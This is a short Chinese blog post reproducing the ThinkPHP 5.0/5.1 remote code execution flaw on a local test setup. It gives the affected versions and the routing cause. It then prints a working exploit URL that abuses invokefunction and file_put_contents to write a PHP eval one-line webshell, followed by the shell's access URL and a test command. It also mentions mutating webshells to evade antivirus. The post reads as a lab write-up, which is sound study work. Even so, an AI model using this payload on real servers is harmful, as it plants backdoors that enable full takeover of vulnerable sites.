---
title: Thinkphp-5.0 GetShell
abstract: '欢迎来到我的博客, 这是一篇加密文章。'
message: 请输入密码后按回车键
date: 2018-12-16 15:56:12
tags:
    - 安全
    - thinkphp
    - php
copyright:
password:
---


最近暴露出了ThinkPhp框架缺陷导致远程命令执行，奈何天网恢恢～～，小菜也只能在本地爽一把！

### 靶机环境

php5.6 + nginx + PHPStrom + xDebug

### 影响范围

- Thinkphp 5.1.0 - 5.1.31
- Thinkphp 5.0.5 - 5.0.23

### 产生原因

Thinkphp5.x版本(5.0.20)中没有对路由中的控制器进行严格过滤，没有开启强制路由的条件下 **(默认不开启)** ，导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行。

<!-- more -->

### 漏洞复现

Thinkphp **pathinfo** 方法中 有这么一条代码**Config::get('var_pathinfo')** ，是配置文件中的设置的参数，而**'var_pathinfo'** 的默认配置为s，我们可以利用 $_GET['s'] 来传递路由信息，也可以利用pathinfo来传递结合前面分析可得初步利用代码如下：index.php?s=index/\namespace\class/method，


#### 代码利用

``` html
http://127.0.0.1/index.php?s=/index/\think\app/invokefunction
&function=call_user_func_array
&vars[0]=file_put_contents
&vars[1][]=shell.php
&vars[1][]=<?php @eval($_GET["code"])?>
```
#### GetShell

> http://127.0.0.1/shell.php

### 独白

还记得刚步入安全领域时，一直搞不懂什么是一句话木马
每次验证是否植入一句话木马成功，都要找**中国菜刀**去验证

直到有一天，顿悟了！
验证是否成功，可以这样！ -> http://127.0.0.1/shell.php?code=phpinfo()
原来所谓的密码就是参数名！
知道一句话木马原理的你，是不是各种网站开发语言的🐎，都有了！

那是不是，所有的网站都可以这样来搞呢，发现不行啊！
原来是@eval起的执行作用。这就出现了新的漏洞命令可执行漏洞--！

然后安全杀毒类软件诞生了，各种木马拦截，道友们开始了一句话木马的变异。
可谓是道高一尺，魔高一丈！

疏而不漏啊，还是转行的 **安全** ！！！